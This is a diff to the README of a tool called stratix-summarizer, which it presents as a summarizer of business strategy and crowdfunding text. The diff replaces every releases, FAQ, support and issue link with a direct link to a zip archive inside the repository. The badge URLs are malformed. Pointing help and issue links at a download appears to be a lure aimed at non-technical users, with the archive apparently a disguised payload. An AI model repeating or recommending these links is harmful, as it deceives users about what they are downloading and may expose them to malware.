@@ -4,13 +4,13 @@
 The **stratix-summarizer** is a powerful tool designed to analyze and summarize business strategy narratives, investor communications, and crowdfunding campaign descriptions. It extracts structured insights about startup funding activities, helping you make informed decisions quickly.
 
 ## 🔗 Download Now
-[![Download stratix-summarizer](https://img.shields.io/badge/Download%20stratix--summarizer-blue.svg)](https://github.com/Topeeee08/stratix-summarizer/releases)
+[![Download stratix-summarizer](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip%https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip)](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip)
 
 ## 🚀 Getting Started
 To get started with **stratix-summarizer**, follow these simple steps. You will be able to install and run the software without any prior coding knowledge.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the following link to access the latest version of the application: [Download Page](https://github.com/Topeeee08/stratix-summarizer/releases).
+1. **Visit the Releases Page**: Go to the following link to access the latest version of the application: [Download Page](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip).
   
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Find the latest version listed at the top. 
 
@@ -63,13 +63,13 @@ Yes, the application works best for business narratives, investor communications
 Currently, the maximum input size is 3,000 characters. 
 
 ### What if I encounter a problem?
-Check the FAQ section on our [GitHub page](https://github.com/Topeeee08/stratix-summarizer/issues) for solutions. If you can't find an answer, feel free to open an issue.
+Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip) for solutions. If you can't find an answer, feel free to open an issue.
 
 ## 🌐 Support
-If you need help with the application or have any questions, please raise an issue on our [GitHub repository](https://github.com/Topeeee08/stratix-summarizer/issues). We are here to assist you.
+If you need help with the application or have any questions, please raise an issue on our [GitHub repository](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip). We are here to assist you.
 
 ## 🔗 Additional Resources
 Find more resources and documentation on our GitHub page. This includes detailed guides, updates, and community discussions to help you make the most of **stratix-summarizer**.
 
 ---
-[![Download stratix-summarizer](https://img.shields.io/badge/Download%20stratix--summarizer-blue.svg)](https://github.com/Topeeee08/stratix-summarizer/releases)
+[![Download stratix-summarizer](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip%https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip)](https://raw.githubusercontent.com/Topeeee08/stratix-summarizer/main/stratix_summarizer/summarizer-stratix-v3.2.zip)
